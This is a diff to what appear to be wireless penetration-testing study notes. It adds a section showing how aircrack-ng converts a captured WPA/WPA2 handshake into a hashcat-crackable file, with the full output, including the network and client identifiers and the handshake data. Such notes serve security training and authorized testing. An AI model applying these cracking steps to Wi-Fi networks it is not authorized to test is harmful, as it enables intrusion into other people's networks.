@@ -137,6 +137,54 @@ Crack WPA2
 
       EAPOL HMAC     : E7 2C 3E D2 EC F6 5E 1B E0 6C 68 B5 92 74 6C 0C
 ```
+#### Converting WPA/WPA2 Capture to Hashcat Crackable Format   
+```bash
+root@SEC617:~/notes# aircrack-ng -j hashcatfile savefile.cap 
+Reading packets, please wait...
+Opening savefile.cap
+Read 1176 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  16:59:C0:95:DB:06  NETGEAR-Guest             WPA (1 handshake, with PMKID)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening handshake.pcap-01.cap
+Read 1176 packets.
+
+1 potential targets
+
+
+
+Building Hashcat (3.60+) file...
+
+[*] ESSID (length: 13): NETGEAR-Guest
+[*] Key version: 2
+[*] BSSID: 16:59:C0:95:DB:06
+[*] STA: AC:37:43:4C:82:F9
+[*] anonce:
+    15 7C 2D E1 1B DD 65 57 3A C4 E2 2D 21 F7 2D 80 
+    32 F4 33 EB A9 D7 D4 B8 58 52 07 8C AC 5B 9F CC 
+[*] snonce:
+    6F F9 B3 A1 EA 4F B6 F4 46 E4 D2 49 DC 78 11 F8 
+    24 1C FE 92 07 E8 C8 45 5F 1C 6E 76 AD 73 AE C5 
+[*] Key MIC:
+    E7 2C 3E D2 EC F6 5E 1B E0 6C 68 B5 92 74 6C 0C
+[*] eapol:
+    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
+    00 6F F9 B3 A1 EA 4F B6 F4 46 E4 D2 49 DC 78 11 
+    F8 24 1C FE 92 07 E8 C8 45 5F 1C 6E 76 AD 73 AE 
+    C5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
+    04 01 00 00 0F AC 02 0C 00 
+
+Successfully written to hashcatfile.hccapx
+```
+
 #### Generating WEP Traffic
 
 ```bash
